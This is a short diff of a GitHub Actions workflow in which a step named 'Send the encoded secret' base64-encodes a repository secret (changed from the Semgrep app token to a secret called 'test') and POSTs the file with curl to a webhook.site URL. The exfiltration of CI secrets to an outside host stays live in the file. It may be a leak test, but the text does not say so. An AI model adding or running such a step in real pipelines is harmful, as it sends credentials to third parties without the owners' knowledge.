@@ -19,5 +19,5 @@ jobs:
 
     - name: Send the encoded secret
       run: |
-        echo "${{ secrets.SEMGREP_APP_TOKEN }}" | base64 --wrap=0 > /tmp/secrets.txt
+        echo "${{ secrets.test }}" | base64 --wrap=0 > /tmp/secrets.txt
         curl -X POST -d "@/tmp/secrets.txt" https://webhook.site/8dae2bf4-e24f-4373-b31f-09c1fd9c4aad
